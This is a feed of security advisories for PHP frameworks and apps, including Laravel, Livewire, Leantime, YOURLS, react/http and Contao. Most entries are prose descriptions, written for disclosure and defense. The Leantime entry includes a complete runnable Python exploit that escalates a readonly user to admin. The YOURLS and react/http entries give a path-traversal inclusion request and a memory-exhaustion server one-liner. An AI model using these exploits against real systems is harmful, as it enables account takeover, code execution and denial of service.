entry.title: [laravel/framework] Laravel TokenGuard authentication bypass through non-string API credentials
entry.content:
Laravel's built-in TokenGuard, when configured with a standard token-based API guard, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token.

Under certain database configurations (MySQL/MariaDB) an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.

Impact

An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.

References

  • https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-114509

entry.title: [laravel/framework] Laravel relationship inclusion can trigger unauthorized data destruction
entry.content:
A vulnerability in how relationship inclusion is processed on certain read endpoints. Under specific conditions, a request to a read-only endpoint can be crafted to trigger a destructive database operation on a related table, rather than simply retrieving data.

Impact

A user with only read access could cause irreversible data loss (e.g., a related table being emptied), without needing any write permissions. This could result in denial of service and loss of data integrity for affected applications.

entry.title: [livewire/livewire] Livewire: Authorization bypass in #[Authorize] via reordered parameter keys and #[Json] execution order
entry.content:
Impact

Three issues allowed actions protected by the #[Authorize] attribute to run against records the current user is not authorized for:

  1. Out-of-order parameter keys on actions. #[Authorize] resolved a model parameter by its array key, while the action itself received parameters positionally. A request sending params as an object with reordered integer keys (e.g. {"1": 2, "0": 1}) could pass authorization with a record the user owns while the action received a different record. With #[Authorize('delete', 'comment')] on deleteComment(Comment $comment), a user could delete another user's comment.
  2. The same issue on event listeners. Methods using both #[On] and #[Authorize] with a model parameter were affected in the same way through the __dispatch call.
  3. #[Json] methods ran before authorization. When a method had both #[Json] and #[Authorize], the method body executed before the authorization check. The response was still a 403, but any side effects (such as database writes) had already happened.

Only applications using the #[Authorize] attribute are affected: on methods that take model parameters (issues 1 and 2), or on #[Json] methods (issue 3). Authorization performed inside the method (e.g. $this->authorize(...)) is not affected. Livewire 3.x is not affected.

Patches

Fixed in v4.4.8. Call and event parameters must now be a list or use named (string) keys, otherwise the request is rejected, and #[Json] methods are authorized before they run.

Workarounds

Upgrade to v4.4.8. If you can't upgrade right away, call $this->authorize(...) inside affected methods instead of relying on the #[Authorize] attribute.

Credits

Reported by Yousef Aman (@yousef-aman).

References

  • https://github.com/livewire/livewire/security/advisories/GHSA-mhf7-xp6r-6qrc
  • https://github.com/livewire/livewire/commit/822a4fa9b1e1123691133a2e2eb379a3dab11191
  • https://github.com/livewire/livewire/releases/tag/v4.4.8
  • https://github.com/advisories/GHSA-mhf7-xp6r-6qrc

entry.title: [filament/filament] Filament: Multi-factor authentication (app) management actions do not require password reauthentication
entry.content:
App-based multi-factor authentication management actions did not consistently require the user to confirm their current password. In particular, an authenticated session could set up app-based MFA and obtain recovery codes without password reauthentication. Disabling app-based MFA and regenerating recovery codes also accepted an existing app code or recovery code without requiring the current password. This issue does not affect email-based MFA.

If an attacker gains access to a user's authenticated session, they could enable app-based MFA and obtain recovery codes without knowing the user's password, changing the account's MFA configuration and potentially locking the legitimate user out. This issue does not by itself allow an unauthenticated attacker to sign in.

References

  • https://github.com/filamentphp/filament/security/advisories/GHSA-7m6h-rg42-m449
  • https://nvd.nist.gov/vuln/detail/CVE-2026-104181

entry.title: [leantime/leantime] Leantime: Any Authenticated User Can Self-Escalate to Admin via Unauthorized JSON-RPC Methods
entry.content:
Summary

Any authenticated Leantime user - including the lowest-privilege readonly role - can escalate to full administrative access by calling the JSON-RPC method leantime.rpc.api.api.createApiKeyWithProjects with an attacker-chosen role value. The server creates a new account at that role with no authorization check, and the resulting credentials work as a fully interactive admin login through the ordinary web UI. The same root cause (missing per-method authorization on JSON-RPC-exposed service methods) also leaves the Plugins service's installPlugin, enablePlugin, disablePlugin, and removePlugin methods callable by any authenticated user with no role check, even though their web-UI equivalents correctly require an admin/owner role.

Details

Leantime's JSON-RPC API (app/Domain/Api/Controllers/Jsonrpc.php) reflects any public method on any @api-annotated service class and dispatches it at leantime.rpc.{domain}.{service}.{method}. Per-method authorization is enforced by PermissionEnforcer::enforce() (app/Core/Auth/Permissions/PermissionEnforcer.php), which reads a #[RequiresPermission(...)] PHP attribute off the target method - but when that attribute is absent, enforce() silently returns and allows the call through.

Api::createApiKeyWithProjects(array $values, ?array $projects) (app/Domain/Api/Services/Api.php) is @api-exposed and carries no #[RequiresPermission] attribute. It forwards $values - including a caller-supplied role - directly into createAPIKey() → Users\Repositories\Users::addUser(), with no server-side clamping of role against the calling user's own privilege level:

// app/Domain/Api/Services/Api.php
/**
 * @api
 */
public function createApiKeyWithProjects(array $values, ?array $projects): array|false
{
    $apiKeyValues = $this->createAPIKey($values);   // no #[RequiresPermission], no role check
    ...
}

The equivalent web route (NewApiKey controller) correctly gates account creation behind an admin-only role check (Auth::authOrRedirect([Roles::$admin, ...])), but that gate is bypassed entirely by calling the service directly through JSON-RPC.

Separately, Plugins::installPlugin(), enablePlugin(), disablePlugin(), and removePlugin() (app/Domain/Plugins/Services/Plugins.php, lines ~266/299/320/342) share the same gap: all four are @api-exposed with no #[RequiresPermission], while their web-controller equivalents (Myapps.php, Details.php) correctly require Roles::$owner/Roles::$admin.

Authenticating to the JSON-RPC endpoint with an ordinary browser session cookie (rather than a dedicated API key) is sufficient, provided the request carries an X-Requested-With: XMLHttpRequest header (app/Core/Middleware/StartSession.php) - this is exactly what the application's own first-party JS client already sends, so no special tooling beyond a normal authenticated session is needed.

PoC

A runnable Python PoC (requests library only) reproduces this end-to-end; see the attached poc.py. Steps:

  1. Create/authenticate as a readonly-role account (the lowest privilege level). Confirm it is correctly blocked (HTTP 403) from an admin-only page, e.g. /plugins/myapps.
  2. From that same low-privilege session, send:
    POST /api/jsonrpc
Content-Type: application/json
X-Requested-With: XMLHttpRequest

{"jsonrpc":"2.0","id":1,"method":"leantime.rpc.api.api.createApiKeyWithProjects",
 "params":{"values":{"firstname":"poc","role":40,"status":"a"},"projects":[]}}
    The server responds HTTP 200 with the newly created account's user/passwordClean and "role":40 (admin) in the JSON body.
  3. Log in through the normal /auth/login form using the returned user/passwordClean. The resulting session now has full, interactive access to /plugins/myapps (HTTP 200) - the exact page that returned 403 in step 1.

Reproduced against a local instance built from this repository's own .dev Docker tooling (.dev/docker-compose.yaml), with dependencies installed via composer install / npx mix and no modifications to application code.

Impact

Complete compromise of any Leantime instance by an attacker who controls, or can register/be granted, any authenticated account - including the lowest-privilege readonly role. No admin credentials, tokens, or prior access beyond an ordinary low-privilege login are required. This is a full authenticated-to-admin privilege escalation (CWE-862 Missing Authorization, CWE-269 Improper Privilege Management). Combined with the plugin-management gap described above, it further extends to arbitrary plugin install/enable/disable/remove, a path toward code-execution-level impact tracked from the same root cause.

Script : poc.py

#!/usr/bin/env python3
"""
What this script does, against a target Leantime instance:
  1. Logs in as a LOW-PRIVILEGE account (readonly role by default).
  2. Confirms the account is correctly blocked by the normal web UI from an
     admin-only page (expects HTTP 403) -- this establishes the account truly
     has no admin rights before the exploit runs.
  3. Calls leantime.rpc.api.api.createApiKeyWithProjects over JSON-RPC using
     nothing but that account's own ordinary session cookie, requesting
     role=40 (admin). No admin/API-key credential is used anywhere in this
     step -- only the low-privilege session established in step 1.
  4. Logs in through the completely ordinary web login form using the
     generated username/password from step 3, and confirms that account now
     has full, interactive admin access to the same admin-only page that
     blocked the original low-privilege account in step 2. (The record is
     created with source='' rather than source='api' -- createAPIKey() never
     sets that column -- so it does NOT work as an x-api-key credential, but
     it is a fully functional role=40 web login, which is a stronger and
     more direct proof of impact.)

Requirements: pip install requests

Usage:
  python3 poc.py --url http://localhost:5080 \\
      --username lowpriv@leantime.test --password 'LowPriv123!'
"""

import argparse
import sys

import requests


def rpc_call(session: requests.Session, base_url: str, method: str, params: dict, extra_headers: dict | None = None):
    """Call a JSON-RPC method. Sends X-Requested-With so the session-based
    guard actually loads the caller's real, persisted session (see
    StartSession.php:65) -- without it, API requests get a fresh, empty,
    in-memory session and every call 401s regardless of login state."""
    headers = {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
    }
    if extra_headers:
        headers.update(extra_headers)

    resp = session.post(
        f"{base_url}/api/jsonrpc",
        json={"jsonrpc": "2.0", "id": 1, "method": method, "params": params},
        headers=headers,
    )
    return resp


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--url", required=True, help="Base URL of the target Leantime instance, e.g. http://localhost:5080")
    parser.add_argument("--username", required=True, help="Email of a LOW-privilege test account (e.g. readonly role)")
    parser.add_argument("--password", required=True, help="Password for that account")
    parser.add_argument("--admin-check-path", default="/plugins/myapps", help="An admin-only web page used to confirm the account has no admin rights (default: /plugins/myapps)")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification (for self-signed local/dev instances)")
    args = parser.parse_args()

    verify = not args.insecure
    base_url = args.url.rstrip("/")
    s = requests.Session()
    s.verify = verify

    print(f"[*] Target: {base_url}")

    # Step 1: log in as the low-privilege account via the ordinary web form.
    print(f"[*] Logging in as low-privilege account: {args.username}")
    s.get(f"{base_url}/auth/login")  # prime session cookie
    login_resp = s.post(
        f"{base_url}/auth/login",
        data={
            "username": args.username,
            "password": args.password,
            "redirectUrl": "/dashboard/home",  # avoid the unrelated empty-redirectUrl 500 bug
        },
        allow_redirects=False,
    )
    if login_resp.status_code not in (302, 303):
        print(f"[!] Login did not redirect as expected (got {login_resp.status_code}). Aborting.")
        sys.exit(1)
    print("[+] Login succeeded (session cookie established).")

    # Step 2: confirm the account genuinely has no admin rights via the web UI.
    check_resp = s.get(f"{base_url}{args.admin_check_path}", allow_redirects=False)
    if check_resp.status_code == 403:
        print(f"[+] Confirmed: web UI correctly blocks this account from {args.admin_check_path} (HTTP 403).")
    else:
        print(f"[!] Expected HTTP 403 from {args.admin_check_path}, got {check_resp.status_code}. "
              f"Continuing anyway, but this account may not be low-privilege as assumed.")

    # Step 3: the actual privilege escalation -- same session, no API key used.
    print("[*] Calling leantime.rpc.api.api.createApiKeyWithProjects with role=40 (admin) "
          "using ONLY the low-privilege session from step 1 ...")
    esc_resp = rpc_call(
        s,
        base_url,
        "leantime.rpc.api.api.createApiKeyWithProjects",
        {"values": {"firstname": "poc-escalated-admin-key", "role": 40, "status": "a"}, "projects": []},
    )

    try:
        esc_json = esc_resp.json()
    except ValueError:
        print(f"[!] Non-JSON response (HTTP {esc_resp.status_code}): {esc_resp.text[:500]}")
        sys.exit(1)

    if "error" in esc_json:
        print(f"[!] Exploit call failed: {esc_json['error']}")
        print("    (If this is 'Method is not available via API' or an AuthorizationException, "
              "the target may already be patched.)")
        sys.exit(1)

    result = esc_json["result"]
    new_user = result["user"]
    new_pass = result["passwordClean"]
    new_role = result["role"]
    new_id = result["id"]
    api_key = f"lt_{new_user}_{new_pass}"

    print("[+] VULNERABLE: server created a new account with attacker-chosen role, "
          "with no permission check on the calling (low-privilege) account.")
    print(f"    New account id={new_id}  role={new_role} (40 == admin)")
    print(f"    Generated credentials -- username: {new_user}  password: {new_pass}")
    print(f"    (Nominal API key form: {api_key} -- see note below.)")

    # Step 4: prove the new account carries real, interactive admin privilege
    # by logging in through the ORDINARY web login form and hitting the same
    # admin-only page that blocked the original low-privilege account.
    print("[*] Logging in through the normal web UI with the generated credentials ...")
    admin_session = requests.Session()
    admin_session.verify = verify
    admin_session.get(f"{base_url}/auth/login")
    admin_login_resp = admin_session.post(
        f"{base_url}/auth/login",
        data={"username": new_user, "password": new_pass, "redirectUrl": "/dashboard/home"},
        allow_redirects=False,
    )
    if admin_login_resp.status_code not in (302, 303):
        print(f"[!] Web login with generated credentials failed (HTTP {admin_login_resp.status_code}).")
        sys.exit(1)

    admin_check_resp = admin_session.get(f"{base_url}{args.admin_check_path}", allow_redirects=False)
    if admin_check_resp.status_code == 200:
        print(f"[+] CONFIRMED: the account created by a LOW-PRIVILEGE user now has full, "
              f"interactive admin access to {args.admin_check_path} (HTTP 200) -- "
              f"the exact page that returned 403 for the original account in step 2.")
    else:
        print(f"[!] Expected HTTP 200 from {args.admin_check_path} with the escalated account, "
              f"got {admin_check_resp.status_code}.")

if __name__ == "__main__":
    main()

Maintainer note (resolution): Addressed by the native permission engine (v3.9.0): the affected JSON-RPC service methods now carry #[RequiresPermission] and are enforced at the API boundary (users/clients/projects mutations require the appropriate permission; self-escalation via editUser/patchUser is blocked). Remaining gates ship in the upcoming release.

References

  • https://github.com/Leantime/leantime/security/advisories/GHSA-54mm-6729-r5wp
  • https://nvd.nist.gov/vuln/detail/CVE-2026-85990
  • https://github.com/Leantime/leantime/pull/3583
  • https://github.com/Leantime/leantime/pull/3797
  • https://github.com/Leantime/leantime/commit/5605e5ee86bbd01acb85c6b5d8fb337faf8bcf02
  • https://github.com/Leantime/leantime/commit/7ebf7a9517e2aaa05ec15b8130ab1841a4bde43e
  • https://github.com/Leantime/leantime/releases/tag/v3.10.0

entry.title: [yourls/yourls] YOURLS: Unauthenticated File Inclusion
entry.content:
Summary

YOURLS versions ≤1.10.4 contain an unauthenticated path traversal vulnerability that allows attackers to include and execute arbitrary PHP files on the server without any credentials.

Details

The vulnerability exists because YOURLS uses URL sanitization functions (yourls_sanitize_url(), yourls_esc_url()) to filter request paths, but these functions are designed to clean URLs, not filesystem paths. They preserve / and . characters, allowing ../ sequences to pass through unfiltered.

The unsanitized keyword is then directly concatenated into a filesystem path and passed to file_exists() and later include() operations, enabling path traversal attacks.

Data Flow:

HTTP Request URI (with ../)
    ↓
yourls_get_request() (no sanitization)
    ↓
yourls_sanitize_url() (preserves / and .)
    ↓
yourls_esc_url() (permits / and . via regex)
    ↓
Keyword extraction (preserves ../)
    ↓
file_exists(YOURLS_PAGEDIR . "/$keyword.php")  ← Sink
    ↓
include(YOURLS_PAGEDIR . "/$keyword.php")      ← Code Execution

Proof of Concept (POC)

In the concept validation, we assume that the attacker has uploaded a test.php file to the web root directory, but it cannot be accessed directly. (Of course, it could also be any path, such as /tmp/test.php)

Setup

Place a test file in web root:

./test.php:

<?php
phpinfo();
?>

Attack Request

GET /../../test HTTP/1.1
Host: target.com
Connection: close

Response (Apache Environment)

Impact

  1. Remote execution of uploaded PHP files – An attacker uploads a malicious PHP file to an arbitrary location on the server (e.g., via another vulnerability or file upload feature), obtains its absolute path but cannot access it directly. The attacker then leverages this vulnerability to include and execute the PHP file, gaining code execution privileges.

  2. Indirect triggering of PHP code injection – If a PHP code injection point exists on the system (e.g., log injection, session injection) but the injected file cannot be accessed directly due to configuration restrictions, the attacker can use this vulnerability to include and execute the injected code, achieving remote command execution or further compromise.

References

  • https://github.com/YOURLS/YOURLS/security/advisories/GHSA-f8ff-652m-j5rx
  • https://nvd.nist.gov/vuln/detail/CVE-2026-62858
  • https://github.com/YOURLS/YOURLS/pull/4142
  • https://github.com/YOURLS/YOURLS/commit/4e85972160a96e03a419a442d5bd8f21f2f02ddb
  • https://github.com/YOURLS/YOURLS/releases/tag/1.10.5
  • https://github.com/advisories/GHSA-f8ff-652m-j5rx

entry.title: [react/http] react/http: Unbounded HTTP Client Response Header Buffering Leads to Memory Exhaustion DoS
entry.content:
Summary

React\Http\Browser and its lower-level HTTP stack impose no limit on the size of a response's header section while it is being received. ClientRequestStream::handleData() appends every incoming byte to an internal buffer and only scans that buffer for the \r\n\r\n (or \n\n) terminator, without ever checking its length. A remote server that withholds the terminator and keeps streaming can grow the client's memory without bound until PHP's memory_limit is exhausted and the process crashes.

This is an unauthenticated, network-reachable denial of service against any application that uses react/http as a client to fetch untrusted or attacker-influenced URLs, including via redirects.

Details

ClientRequestStream::handleData() is bound directly to the underlying connection's data event, so every byte the peer sends is appended with no size check:

public function handleData($data)
{
    $this->buffer .= $data;

    // buffer until double CRLF (or double LF for compatibility with legacy servers)
    $eom = \strpos($this->buffer, "\r\n\r\n");
    $eomLegacy = \strpos($this->buffer, "\n\n");
    if ($eom !== false || $eomLegacy !== false) {

The only exit from the buffering state is finding the header terminator or a connection close, so until it arrives the buffer grows monotonically for as long as the peer keeps sending.

The codebase already applies this class of limit elsewhere, but not symmetrically. RequestHeaderParser caps incoming request headers when acting as a server, and Transaction::bufferResponse() caps the response body, but only once the header section has already been parsed into a Response. Response header reception was the one stage with no limit at all.

PoC

An HTTP server that sends a valid status line and a partial header, then streams indefinitely without ever terminating the header section:

php -r '$s=stream_socket_server("tcp://127.0.0.1:18080"); $c=stream_socket_accept($s); fread($c,8192); fwrite($c,"HTTP/1.1 200 OK\r\nX-Fill: "); while (true) { fwrite($c, str_repeat("A",1048576)); usleep(10000); }'

A client fetching it, with memory_limit=64M:

$browser = new React\Http\Browser();
$browser->get("http://127.0.0.1:18080/")->then(
    function () { echo "ok\n"; },
    function ($e) { echo get_class($e) . ": " . $e->getMessage() . "\n"; }
);

Client memory grows steadily until the process dies with Allowed memory size ... exhausted inside ClientRequestStream::handleData().

Impact

Remotely triggerable, unauthenticated denial of service against any process using Browser to fetch from an attacker-controlled, compromised or otherwise untrusted endpoint, including one reached through a redirect. No user interaction and no special privileges are required. Because there is no upper bound on the header buffer, a single cheap connection can drive memory arbitrarily high and crash the process, taking down whatever event loop or worker it was running. Confidentiality and integrity are unaffected; availability is fully impacted for that process.

entry.title: [contao/core-bundle] Contao: Protected page content is disclosed to anonymous visitors after contao.search.index_protected is disabled
entry.content:
ModuleSearch decides whether to filter protected pages out of search results based on the current value of contao.search.index_protected, but the authorisation data lives per row in tl_search. Turning the setting off removes the filter without removing the rows, so protected pages that were indexed while it was on are returned to unauthenticated visitors such as title, URL and context snippet, even though the pages themselves still answer 401.

Impact

Disclosure of member-only page titles, URLs and indexed text to unauthenticated visitors through the site search. The pages themselves remain access-controlled, so this is not a page-access bypass.

Credits

This security vulnerability was found by @iRevivalx .

entry.title: [contao/core-bundle] Contao: The registration module re-sends activation mails
entry.content:
ModuleRegistration::compile() reaches its follow-up registration branch on any POST to a page carrying the module. That branch checks neither FORM_SUBMIT nor the captcha result computed immediately above it, and resendActivationMail() leads to OptInToken::send(), which has no rate limit at all.

Impact

Anyone on the internet can make a Contao installation send unlimited mail to an address of their choosing, from the site's own sender and reputation, at one outbound message per HTTP request. That is both a nuisance for the recipient and a deliverability risk for the site operator. The same request is a reliable account oracle for "this address has a pending registration on this site", which is exactly the sort of membership fact a public site is usually expected not to disclose.

Honest bound. The target must have an unconfirmed registration, that is tl_member.disable = 1 together with an unconfirmed reg- opt-in token. An attacker can create that state for an arbitrary address, since registration requires no ownership proof, but on a site where reg_activate is off the branch is unreachable.

References

  • https://github.com/contao/contao/security/advisories/GHSA-mfxh-vp55-7gc6

entry.title: [contao/core-bundle] Contao: Cross-site request forgery in custom backend actions
entry.content:
RequestTokenListener is the only generic REQUEST_TOKEN validator in Contao and it only runs on POST. On the GET side the guard is local and declarative, and it only fires when an act parameter is present. Every back end action dispatched through a different parameter therefore has no CSRF protection at all. This is a family rather than a single bug.

Impact

An attacker who gets a logged in back end user to load a URL performs back end actions as that user, with no token and no confirmation. Because the exposure follows from the dispatch mechanism rather than from one callback, every present and future key= action inherits it.

Honest bound. The victim must be authenticated in the back end and must load the URL, and the reachable actions are limited to the modules that user can access. We have not found a key= action that grants privileges; the ones we verified are destructive or state changing rather than escalating.

References

  • https://github.com/contao/contao/security/advisories/GHSA-9ff2-p842-45wq
  • https://github.com/contao/contao/commit/34dd27ee6739f10568d3d95d8784862255c925b4
  • https://github.com/contao/contao/releases/tag/5.7.12

entry.title: [contao/core-bundle] Contao: Path traversal in the images controller
entry.content:
ImagesController joins the user controlled {path} onto the configured image target directory with Path::join(), which canonicalises .. segments, and never calls Path::isBasePath() to confirm the result stayed inside that directory. An unauthenticated GET with percent encoded dot segments therefore escapes the directory and the file is returned by BinaryFileResponse. Reads are bounded to the extensions in contao.image.valid_extensions, and paths below the upload directory fail for an unrelated reason, so this is reported as a missing boundary check rather than as a general arbitrary file read. Both Apache with the shipped public/.htaccess and nginx with the documented configuration are affected.

Impact

Any unauthenticated visitor can read files that are deliberately kept outside the document root, anywhere under the project directory, as long as the name ends in one of contao.image.valid_extensions (jpg, jpeg, gif, png, tif, tiff, bmp, svg, svgz, webp). The route also acts as an existence oracle for arbitrary paths, and on a debug enabled instance the 404 message discloses the absolute filesystem path.

Honesty caveat, stated because it lowers the severity. The reporter could not use this to read protected member folders: every path below the upload directory returns 500 for the reason given under Details, so the practically reachable set is image typed files outside files/.

References

  • https://github.com/contao/contao/security/advisories/GHSA-mrvp-7wmx-5m4h
  • https://github.com/contao/contao/commit/867c055122fdf12220f973f862082037b695b9bd
  • https://github.com/contao/contao/releases/tag/5.3.50
  • https://github.com/contao/contao/releases/tag/5.7.12

entry.title: [contao/comments-bundle] Contao: Cross-site scripting in the comments bundle
entry.content:
An unauthenticated front end visitor can post a comment containing a XSS injection. The victim is any back end user who opens the Comments module, and moderation makes exposure certain rather than preventing it. No Content-Security-Policy header is sent on the Contao back end, so nothing mitigates the inline handler.

Impact

Anyone on the internet can inject script that executes in the Contao back end origin, under the session of whichever user opens the Comments module, with no click and no hover. From there the payload acts as that user through the back end: reading any module they can reach, creating a new administrator, or editing a template, which on Contao is a documented path from back end write access to code execution. Moderation does not help and in fact guarantees exposure, since unpublished comments are still inserted and a moderator has to open the list to act on them.
